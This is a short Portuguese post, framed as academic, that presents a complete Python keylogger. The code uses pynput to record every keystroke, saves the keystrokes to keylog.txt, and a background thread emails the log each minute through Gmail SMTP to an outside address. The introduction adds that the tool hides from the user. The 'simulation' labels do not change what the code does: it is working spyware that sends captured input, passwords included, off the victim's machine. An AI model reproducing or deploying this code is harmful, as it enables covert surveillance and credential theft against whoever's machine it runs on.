### Keylogger para fins academicos
Implementei um script em Python para captura de teclas salvar em um arquivo .txt, fazer o envio automático por e-mail e esconder do usuario.

**Código**:
```python
import threading
import time
import smtplib
from email.mime.text import MIMEText
from pynput import keyboard  # Necessário instalar: pip install pynput (para simulação educacional)

# Variáveis globais
log = ""  # Armazena as teclas capturadas
email_interval = 60  # Intervalo em segundos para envio de e-mail (ex.: a cada 1 minuto)
email_sent = False  # Flag para controlar envio

# Configurações de e-mail (use contas de teste para simulação!)
EMAIL_ADDRESS = "seu_email_teste@gmail.com"
EMAIL_PASSWORD = "sua_senha_app"  # Use senha de app para Gmail
DESTINO_EMAIL = "destino_teste@gmail.com"

# Função para capturar teclas
def on_press(key):
    global log
    try:
        log += key.char  # Adiciona caractere normal
    except AttributeError:
        # Teclas especiais
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        else:
            log += f"[{key}]"  # Outras teclas especiais

# Função para salvar log em arquivo
def salvar_log(arquivo="keylog.txt"):
    global log
    with open(arquivo, "a") as f:
        f.write(log)
    log = ""  # Reseta o log após salvar

# Função para enviar e-mail com o log
def enviar_email(log):
    msg = MIMEText(log)
    msg['Subject'] = "Log de Teclas Capturadas (Simulação)"
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = DESTINO_EMAIL

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, DESTINO_EMAIL, msg.as_string())
        server.quit()
        print("E-mail enviado com sucesso (simulação).")
    except Exception as e:
        print(f"Erro ao enviar e-mail: {e}")

# Função para monitoramento e envio periódico
def monitorar_e_enviar():
    global email_sent
    while True:
        time.sleep(email_interval)
        if log:
            salvar_log()
            enviar_email(open("keylog.txt", "r").read())
            email_sent = True

# Função principal para simular o keylogger
def simular_keylogger():
    # Iniciar thread para monitoramento e envio
    thread_monitor = threading.Thread(target=monitorar_e_enviar)
    thread_monitor.daemon = True  # Torna a thread daemon para encerrar com o programa
    thread_monitor.start()

    # Listener de teclado
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Exemplo de uso (execute em ambiente controlado!)
if __name__ == "__main__":
    print("Simulando keylogger... Pressione teclas para capturar.")
    simular_keylogger()
